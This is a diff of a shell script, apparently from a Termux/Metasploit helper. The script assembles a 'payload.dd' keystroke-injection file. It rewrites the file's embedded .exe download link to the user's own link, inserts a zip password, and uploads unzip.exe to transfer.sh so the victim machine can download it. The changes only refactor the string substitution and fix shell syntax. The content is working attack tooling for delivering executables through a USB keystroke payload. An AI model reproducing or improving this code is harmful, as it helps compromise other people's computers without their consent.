@@ -184,9 +184,10 @@ if [ $password_zip = "" ]; then
 	continue
 else
 	echo "::::The .dd file is creating .."
-	rm $FOLDER_USEFUL/payload.dd
-	cp $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
-
+	rm -f $FOLDER_USEFUL/payload.dd
+	#cp $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
+	touch $FOLDER_USEFUL/payload.dd
+	python $HOME/msf/script/replace.py "$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)" "$(cat $LINKFILE)" $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
 	#echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > $FOLDER_USEFUL/payload.dd
 	echo "\n\n\n\n DD FILE ::::\n\n\n $(cat $FOLDER_USEFUL/payload.dd)\n\n\n"
 	echo "::::The links have been changed"
@@ -194,10 +195,11 @@ else
 	curl --upload-file $TEMP/unzip.exe https://transfer.sh/unzip.exe > $LINK7ZIP
 	echo "\n LINK of unzip.exe :::: $(cat $LINK7ZIP)"
 	#echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s/PASSX/$password_zip/")" > $FOLDER_USEFUL/payload.dd
+	python $HOME/msf/script/replace.py "PASSX" "$password_zip" $FOLDER_USEFUL/payload.dd $FOLDER_USEFUL/payload.dd
 	echo "\n\n\n\n DD FILE ::::\n\n\n $(cat $FOLDER_USEFUL/payload.dd)\n\n\n"
-	perl -i -pe 's/(http[^ ]+\.exe)/$ENV{"LINKFILE"}/ if /http.*\.exe/; s/PASSX/$ENV{"password_zip"}/g; s/7ZIPLINK/$ENV{"LINK7ZIP"}/g' "$FOLDER_USEFUL/payload.dd"
 
 	#echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s#7ZIPLINK#$(cat $LINK7ZIP)#")" > $FOLDER_USEFUL/payload.dd
+	python $HOME/msf/script/replace.py "7ZIPLINK" "$(cat $LINK7ZIP)" $FOLDER_USEFUL/payload.dd $FOLDER_USEFUL/payload.dd
 	echo "\n\n\n\n DD FILE ::::\n\n\n $(cat $FOLDER_USEFUL/payload.dd)\n\n\n"
 	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
 fi
@@ -231,9 +233,10 @@ fi
 
 
 
-echo "\033[1;35m\n:::: Do you want to open the link ? (for QR CODE or Sharing)\nType y for YES, or press Enter to Leave\033[0m"
+echo "\033[1;35m\n:::: Do you want to open the link ? (for QR CODE or Sharing)\nType y for YES, or press Enter to Leave\n (Only available on Termux)\033[0m"
 read openlink
 if [ $openlink = "y" ]
+then
 	termux-open-url $NEWLINK
 fi
 exit
